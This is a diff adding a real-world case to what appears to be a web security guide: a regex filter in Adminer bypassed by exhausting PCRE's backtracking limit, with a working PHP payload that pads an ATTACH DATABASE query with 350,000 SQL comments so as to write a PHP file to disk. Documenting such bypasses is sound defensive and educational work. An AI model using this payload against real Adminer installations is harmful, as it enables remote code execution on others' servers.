@@ -68,6 +68,32 @@ if (preg_match($pattern, $subject)) {
 }
 ```
 
+**Real-Word case: Adminer SQLite RCE**:
+
+Adminer used a regular expression to prevent SQLite queries beginning with ATTACH:
+
+```php
+$pattern = "~^(?:\\s|/\\*[\s\S]*?\\*/|(?:#|--)[^\n]*\n?|--\r?\n)*+ATTACH\\b~i";
+if(preg_match($pattern, $query, $match)){
+ die('error');
+}
+```
+
+The check treated both `0` (no match) and `false` (regular expression evaluation failure) as an allowed query. An attacker could prefix an `ATTACH` query with hundreds of thousands of empty SQL comments:
+
+```php
+<?php
+$payload = <<<'SQL'
+ATTACH DATABASE 'lol.php' AS lol;
+CREATE TABLE lol.pwn (data text);
+INSERT INTO lol.pwn (data) VALUES ('<?php phpinfo(); ?>');
+SQL;
+
+echo str_repeat("--\n", 350000) . $payload;
+```
+
+Processing the comments exhausted PHP PCRE's backtracking limit. `preg_match()` returned `false`, which the application confused with a clean non-match. The blocked `ATTACH` query was consequently executed.
+
 ## References
 
 * [Intigriti Challenge 1223 - Hackbook Of A Hacker - December 21, 2023](https://web.archive.org/web/20260210185049/https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)
